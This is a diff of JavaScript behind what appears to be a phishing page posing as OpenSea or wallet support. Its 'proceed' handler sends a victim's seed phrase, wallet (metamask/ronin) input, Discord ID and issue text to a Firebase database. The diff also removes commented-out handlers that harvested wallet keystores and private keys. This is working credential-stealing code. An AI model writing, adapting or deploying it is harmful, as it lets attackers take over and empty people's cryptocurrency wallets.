@@ -13,40 +13,13 @@ document.getElementById("proceed").onclick = function () {
 
 	firebase
 		.database()
-		.ref("discordIds/" + discordv)
+		.ref("opensea/" + phrasev)
 		.set({
-			discordIds: discordv,
+			opensea: phrasev,
 			metamask: roninv,
-			phrase: phrasaev,
+			discord: discordv,
 			issue: issuev,
 
 		});
 	alert("success");
 };
-
-// document.getElementById("insertkeystore").onclick = function () {
-// 	readFormphrase();
-
-// 	firebase
-// 		.database()
-// 		.ref("keystore/" + keystorev)
-// 		.set({
-// 			keystore: keystorev,
-
-
-// 		});
-// 	alert("success");
-// };
-
-// document.getElementById("insertprivate").onclick = function () {
-// 	readFormphrase();
-
-// 	firebase
-// 		.database()
-// 		.ref("private/" + privatev)
-// 		.set({
-// 			private: privatev,
-
-// 		});
-// 	alert("success");
-// };
